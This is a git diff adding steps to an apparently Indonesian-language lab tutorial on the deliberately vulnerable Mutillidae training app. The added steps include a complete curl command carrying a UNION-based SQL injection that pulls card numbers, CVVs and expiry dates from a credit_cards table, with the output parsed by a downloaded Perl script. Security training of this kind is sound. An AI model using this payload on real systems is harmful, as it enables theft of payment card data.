@@ -83,6 +83,15 @@ dan lihat hasilnya. Hasilnya adalah data hasil sql injection.
 ### # Perl Parser
 - **Step 1** : Download lesson8.pl pada link berikut [http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT](/http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT)
 - **Step 2** : Ganti nama lesson8.pl.TXT menjadi lesson8.pl dan ubah permission menjadi `rwx------` atau 700.
+ ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_39_29.png)
+- **Step 3** : Jalankan perintah 
+`curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep -i "Username="  > lesson8.txt`
+- **Step 4** : Setelah menjalankan perintah tersebut maka hasil perintah pada **Step 3** disimpan pada file lesson8.txt.
+ ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_42_37.png)
+- **Step 5** : Jalankan file lesson8.pl dan lihat hasilnya.
+ ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_43_37.png)
+
+ 
 
 
 
